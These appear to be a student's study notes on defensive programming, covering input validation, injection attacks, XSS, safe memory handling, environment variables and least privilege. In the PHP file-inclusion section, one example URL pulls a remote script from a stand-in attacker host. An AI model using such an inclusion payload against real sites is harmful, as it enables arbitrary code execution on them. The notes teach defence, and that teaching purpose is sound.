---
publish: true
---
The *best defence* against software vulnerabilities is to prevent them occurring by writing *safe code* and correctly handling *I/O* 

## Defensive programming

>[!important] Definition
>Designing software so it continues to function even when under attack

Software should detect erroneous conditions resulting from an attack and 
+ continue executing *safely* **OR**
+ *fail* gracefully

>[!important] 
>*Never assume anything*
>
>Check all assumptions and handle any possible error state

>[!note] 
>Vulnerabilities are triggered by very different from usual imputs so it's unlikely to identify them by common testing approaches

In general it's more difficult to consider all points of *failures* 

Programmers make *assumptions* on input and environment that should be **validated** instead

>[!warning] 
>**Security has a cost** 

Defensive programming requires *awareness* of :
+ *consequences* of failure
+ attacker *techniques*
+ vulnerabilities can be triggered by *highly unusual input*

### Input Validity and Interpretation

Assuming **input validity** is very *problematic*

>[!example] 
>*Hearbleed* vulnerability. The program didn't check the amount of requested data leading to a *buffer over-read*

Input **Interpretation** is an important source of vulnerabilities

>[!example] 
>*Charset confusion* is a source of vulnerability when we baypass a blacklist by using an alternate encoding
>
>*Type confusion* also leads to attacks like integer overflow, code injection etcc

#### Injection attack

>[!important] Definition
>Attacker *injects* a malicious payload to *affect* the *flow* of the program
>
>Typical in scripting languages like *SQL* and *perl CGI*

*Command Injection* ( command when we are dealing with OS commands ) is an *input interpretation* problem , a possible fix is **whitelisting** if we expect something in particular

*Code Injection* happends inside programs and is executed with the same privileges of that program

>[!example] 
>*Shellcodes* or *PHP file inclusion*
>
>

>[!note] 
>With *PHP* file inclusion an attacker can inject a malicious page on the URL and the code from that page would be included and evaluated on the page itself and can execute arbitrary code
>
>>[!example] 
>>`https://foo.com/index.php?p=http://hack.site/hack.txt`

#### Cross-site scripting ( XSS )

Is a *code injection attack* that bypasses the fact that broswers limit script access to pages that belong to the *same site* 

#### Validating input syntax 

There are *two* main techniques to validate the input :
+ **Whitelisting**
	+ Compare input data against what is wanted
>[!important] 
>This is hard to bypass if *whitelisting* is strict enough
+ **Blacklisting**
	+ Compare input data with known dangerous values
>[!example] 
>Disallow/escape special characters such as `;` , `'`  

This can be *bypassed* through *encodings* 
### Writing safe code

+ **Correct algorithm implementaion**

In general we should try to avoid writing *buggy* *implementations* since bugs might introduce security risks

>[!example] 
> + Poor random number generation allowed for session hijacking in *TCP*

+ **Correct interpretation of data**

Data should be interpreted consistenly to prevent *inappropiate manipulation* 

In general using ***strongly typed*** languages ensures this is the case , otherwise in *loosely typed* language allows for *liberal casting* leading to incorrect manipulation of pointers

+ **Correct use of memory** 

Programs allocate memory on the heap. This should be *released* when the tasks have been performed

Incorrect memory deallocation may lead to *crashes* , in general it's better to use languages that manage memory automatically
### Handling Interaction

>[!important] Definition
>*Environment variables* are a collection of string values inherited by each process from its parent that can affect the way a running process behaves 

>[!example] 
>In Unix common variables are :
>`PATH` directories for commands
>`LD_LIBRARY_PATH` directories for dll's

If an attacker has control over the system it could modify the `PATH` variable in order to make the user use a *malicious* `sed` or `grep` a solution could be to specify the actual *binary* paths before executing `sed` or `grep`

>[!warning] 
>Program using *custom variables* should always threath them as **untrusted input**

---

Programs should execute with the *least privileges needed*

Other strategies are : 
+ *Drop privileges* as soon as they have been used
+ *Modularize* programs and assign least privileges to modules
+ *Sandbox* programs in order to isolate them ( containers, virtualization ... )
+ [[Magistrale/1 anno/2nd Semester/System Security/Access Control#Mandatory Access Control (MAC)|MAC]] 

---

*Temporary files* should always be created using a *suitable library function* to create temporary files with random names 
### Handling output

Also the *output* should be validated and correctly interpreted , it should be checked before it is *displayed* or *saved*

Solutions :
+ *Blacklisting* dangerous content ( HTML tags etcc )
+ *Whitelist* the output if possible 

